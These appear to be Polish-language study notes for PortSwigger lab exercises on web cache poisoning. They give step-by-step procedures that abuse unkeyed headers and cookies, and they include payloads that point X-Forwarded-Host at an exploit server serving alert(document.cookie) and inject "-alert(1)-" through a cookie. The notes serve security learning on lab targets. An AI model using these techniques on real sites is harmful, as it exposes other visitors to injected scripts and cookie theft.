param miner:
nowe cache buster in cachekey (GET /?cb=1)
cache: miss
 
 <hr>
 Żądania GET
 <br>
Tak, żądania GET są zwykle cache’owane.
Powód: GET jest idempotentny (czyli nie zmienia stanu serwera).
Cache (przeglądarka, CDN, reverse proxy) może zapamiętać odpowiedź GET i podawać ją kolejnym użytkownikom, jeśli nagłówki i polityka cache na to pozwalają (Cache-Control, Expires).

 <br><br>

Żądania POST
 <br>
Nie, żądań POST zwykle się nie cache’uje.
Powód: POST jest niemal zawsze używany do zmiany stanu serwera (np. wysłanie formularza, dodanie rekordu do bazy).
Cache nie powinien zwracać zapisanej odpowiedzi POST, bo każdy POST może dawać inną odpowiedź w zależności od danych przesyłanych w ciele żądania.

 <br><br>

Zmanipulowane cache
<br>
<img width="737" height="191" alt="image" src="https://github.com/user-attachments/assets/330dc2a1-dfed-4e77-9187-87924fe9c3dd" />


zapobieganie
<br>
Even if you do need to use caching, restricting it to purely static responses is also effective, provided you are sufficiently wary about what you class as "static". For instance, make sure that an attacker can't trick the back-end server into retrieving their malicious version of a static resource instead of the genuine one.

  <br><br>

Nawet jeśli musisz używać cache (pamięci podręcznej), np. dla wydajności, ograniczenie cache tylko do statycznych zasobów (np. obrazki, pliki CSS, JavaScript, które się nie zmieniają dynamicznie) jest skuteczne. Innymi słowy: nie cache’uj dynamicznych stron generowanych indywidualnie dla użytkowników (np. dashboard, koszyk w sklepie, strony z danymi konta), bo to zwiększa ryzyko web cache poisoning. Ważne jest, żeby dokładnie wiedzieć, co naprawdę jest statyczne. Nie wszystko, co wygląda na stałe, musi nim być – np. plik z URL-em /script.js?v=123 może być dynamicznie generowany przez serwer. Trzeba upewnić się, że atakujący nie może wprowadzić własnej, złośliwej wersji pliku, którą serwer potem zapisze w cache zamiast prawdziwego pliku. Przykład: atakujący podmienia URL lub nagłówek w żądaniu, serwer traktuje to jako „statyczny zasób” i zapisuje jego wersję w cache → wszyscy użytkownicy dostają złośliwą wersję.

  <br><br>

https://portswigger.net/research/practical-web-cache-poisoning

   <br><br>
<hr> <br><br>
<h2>Lab: Web cache poisoning with an unkeyed header</h2>

 <br>

unkeyed input – ryzyko web cache poisoning

Unkeyed input to dane, które wpływają na odpowiedź serwera, ale nie są brane pod uwagę przy tworzeniu klucza cache, przez co mogą powodować błędy w przechowywaniu i zwracaniu odpowiedzi.

  <br>

1.original request 2x 
Miss (response nie znajduje w cache) 
Hit (response już jest w cache) 

 <br>
 
2./?cb=kasia123  
Cache: Miss 
param min> guest headers 

 <br>

3.wynik w target > sitemap> issues 

x-forwarded-host header is an unkeyed header 

 <br>

4./?cb=kasia123 
X-Forwarded-Host: wartość URL exploit serwera 


„Hej, traktuj exploit-server.com jako host tej aplikacji.” 

Bo Nagłówek X-Forwarded-Host jest używany głównie przez: reverse proxy, load balancer, CDN 

X-Forwarded-Host wskazuje oryginalny host (domenę), którego użył klient, zanim request przeszedł przez proxy / load balancer / CDN.
 
  <br>

5.Aplikacja używa wartości xfh do zbudowania adresu w script src.
exploi server odbity w body. Kopiujemy zasob, który jest dalej.


Jest uzyty przez .js tracking file

/resources/js/tracking.js 

  <br>

6.Wklejamy w exploit server, <br>

file: /resources/js/tracking.js 
body: alert(document.cookie); 
 <br>
Store 
 
 <br>
 
7.wysalc jeszcze to samo żądanie, aż będzie cache hit. 

  <br>

8.w przeglądarce doklejamy do strony głównej 

/?cb=kasia123

i mamy popup 

  <br>

9.dystrybuujemy atak do strony głównej 
W request zostawiamy / i wysyłamy dwa razy 
(kasuejmy /?cb=kasia123) 
 
 <br>
 ad.2
 <img width="1192" height="515" alt="image" src="https://github.com/user-attachments/assets/ec209564-4602-433a-9de5-226f535d0885" />
 
<img width="908" height="389" alt="image" src="https://github.com/user-attachments/assets/d1afe6cf-0c16-4a7a-a77b-c79f2c6e7602" />

<br><br>
 ad3.<br>

 <img width="1003" height="625" alt="image" src="https://github.com/user-attachments/assets/92dc8e00-ad0f-4c37-9dbc-beefc3cf928e" />
<br><br>
ad4.<br>

<img width="1197" height="642" alt="image" src="https://github.com/user-attachments/assets/844f7bf4-b491-479c-94a2-410c23aea46b" />
<br><br>

<img width="841" height="606" alt="image" src="https://github.com/user-attachments/assets/b8412e31-bd8d-422e-916b-de9013784ff6" />

<br><br>
<img width="1470" height="647" alt="image" src="https://github.com/user-attachments/assets/bc0635af-a6e6-4fbe-bd1a-3d62a9b869e5" />
<br><br>

<img width="1487" height="744" alt="image" src="https://github.com/user-attachments/assets/260d9a15-b91e-47c4-8c26-fd6e34009a61" />



Atakujący wysyła do serwera żądanie z nagłówkiem X-Forwarded-Host, ustawionym na swoją złośliwą domenę.
Serwer ufa temu nagłówkowi i generuje stronę HTML, w której umieszcza link do skryptu z tej złośliwej domeny.
Cache zapisuje tę wygenerowaną stronę jako normalną wersję strony głównej, ponieważ nie bierze pod uwagę nagłówka X-Forwarded-Host przy tworzeniu klucza cache.
Gdy zwykły użytkownik wejdzie na stronę główną, dostaje z cache zatrutą wersję HTML.
Jego przeglądarka ładuje złośliwy skrypt z serwera atakującego, a ten skrypt wykonuje się w kontekście strony i może odczytać document.cookie.

<br><br>
<hr>
<br><br>
<h2>Lab: Web cache poisoning with an unkeyed cookie </h2>
 
 <br>

Cookies aren't included in the cache key! Mogę je zmieniać i cały czas jest hit. 
 
1.Check / request 
Cache-Control: max-age=30 - może być cache’owana przez 30 sekund,
Age: 1 - aktualnie ma 1 sekundę, 
X-Cache: hit – jest w cache

<br>

2.Cache- buster GET     > part of cache key
/?cb=kasia123 miss hit

  <br>

Miss-hit pojawia się tylko po alteracji GET, 
po zmianie ciasteczka feshost, zawsze jest hithit

It means, this is GET query string is a part of cache key 
Use this as a part of CB, not to not impack other users visiting / page that we are probing, and to test fresh uncached requests 

<br>

3.fing unkeyed input: long story short: param>guess cookie z cache buster w GET > MI SKAN NIE DZIAŁA
Cookie: session=9gmLxSJpmBeVw8WVG6uWluicMVmP4Cga; fehost=prod-cache-01 
prod-cache-01 jest odbite już w odpowiedzi, wiec jest to ważne zrodlo umieszczenia js

fehost=prod-cache-03

<script>  data = {"host":"0a0a007c030ae19c80036c210097001a.web-security-academy.net","path":"/","frontend":"prod-cache-03"} </script> ```
 
 <br>
 
4.fehost robimy pusty  
fehost= 

"frontend":""

 <br> 
 
5.final payload

fehost
"-alert(1)-"

```<script> data = {"host":"0ac5004b043c07b180c23a8a007d00de.web-security-academy.net","path":"/","frontend":""-alert(1)-""} </script>```



<img width="1128" height="552" alt="image" src="https://github.com/user-attachments/assets/3bf7006e-b706-4bb9-8c83-a7f30a53b3a0" />

<br><br>

<img width="1204" height="522" alt="image" src="https://github.com/user-attachments/assets/8e9f2cb0-2f5e-4182-9910-a49e878a9402" />



(musi być hit w odpowiedzi, żeby się zapisało w cache):


<img width="1235" height="537" alt="image" src="https://github.com/user-attachments/assets/1fcd3e39-90a7-4a2b-bd1b-93f7b424b2c9" />

  
  <br>
  <hr>
  <br> 

<h2>Lab: Web cache poisoning with multiple headers </h2>
 <br>
notes:

X-Forwarded-Scheme is an HTTP request header used to identify the original protocol (HTTP or HTTPS) a client used to connect to a proxy or load balancer.

<br>

Long story short:

Aplikacja ma dwa ukryte nagłówki. Drugi wyszukujemy dopiero jak wprowadzimy do żądania pierwszy wykryty.
Nagłówek X-Forwarded-Scheme jeśli ma wartość inną niż https, powoduje redirect do tracking cooki, zaciągając do Location host z X-Forwarded-Host.
Będąc w GET /resources wprowadzamy X-Forwarded-Scheme:http i X-Forwarded-Host: exploit server.
W explot server poprawnie uzupełniamy file i body. Store.
Cachujemy ww. GET póki nie będzie hit.
Odświeżamy stronę główną. Vuala.

test cache miss hit 

param miner 1st > insert new header
param miner 2nd

new /?cb=6
X-Forwarded-Host: exploit-0a11008604ffa19d80ac4d970137004d.exploit-server.net
body exploit server:
alert(document.cookie);
file: resources path
browsre lab/?cb=6

<br>

GET change to /resources path

<hr>
<img width="1201" height="484" alt="image" src="https://github.com/user-attachments/assets/93669f29-caed-4193-868a-fd56bd9295ea" />

<br><br>

<img width="1196" height="341" alt="image" src="https://github.com/user-attachments/assets/9e45d7bb-906f-4d90-bbf7-1e3bb6e2b54f" />

<br><br>

<img width="989" height="667" alt="image" src="https://github.com/user-attachments/assets/5665f3d9-7f5c-483c-882b-9d2e6f1c3540" />

<br><br>

<img width="1166" height="605" alt="image" src="https://github.com/user-attachments/assets/33589442-b29a-4c07-be24-e3a8c3eaa86c" />

<br><br>

<img width="1118" height="599" alt="image" src="https://github.com/user-attachments/assets/d92d2aa7-3c76-4b0f-b454-7dbc11ad35fc" />

<br><br>

<img width="1112" height="547" alt="image" src="https://github.com/user-attachments/assets/d2bc9d60-aa35-4c17-a71b-4a83f7091bc4" />

<br><br>

<img width="986" height="518" alt="image" src="https://github.com/user-attachments/assets/2a005ad4-65e7-46c7-b9f1-5e93d142b414" />

<br><br>

<img width="1155" height="364" alt="image" src="https://github.com/user-attachments/assets/376b2b2e-567e-4119-a7b4-ed1e81f07ca8" />

<br><br>

<img width="1118" height="383" alt="image" src="https://github.com/user-attachments/assets/29e75538-0d17-4746-aafa-bf1e7460d1d7" />

<br><br>

<img width="1137" height="702" alt="image" src="https://github.com/user-attachments/assets/df87cc51-24e8-44d5-bed0-241bd7493179" />

<br><br>

<img width="1544" height="659" alt="image" src="https://github.com/user-attachments/assets/cf787832-c286-4fcf-9ab6-76f466a8dbe3" />

<br><br>
<hr>
<br><br>
<h2>Lab: Targeted web cache poisoning using an unknown header</h2>

You need to poison the cache with a response that executes alert(document.cookie) in the visitor's browser. 
Target users: Należy jednak upewnić się, że odpowiedź zostanie wysłana do konkretnej grupy użytkowników, do której należy dana ofiara.

Vary to nagłówek odpowiedzi HTTP, który mówi cache:
„Ta odpowiedź zależy od konkretnego nagłówka z requestu — jeśli on się zmieni, stwórz nowe cache.”

1. GET /cb=1
resp: miss
param miner > guess header
x-host:

CACHE KEY HERE: REQUEST METHOD & IT'S VALUE (/path/in/GET)

response !!! VARY:USER AGENT

serwer w odpowiedzi HTML wskazuje na złośliwy host, a przeglądarka ten plik pobierze

<img width="1196" height="560" alt="image" src="https://github.com/user-attachments/assets/2fe8b478-0c9c-40a8-a70b-aee9332cab48" />



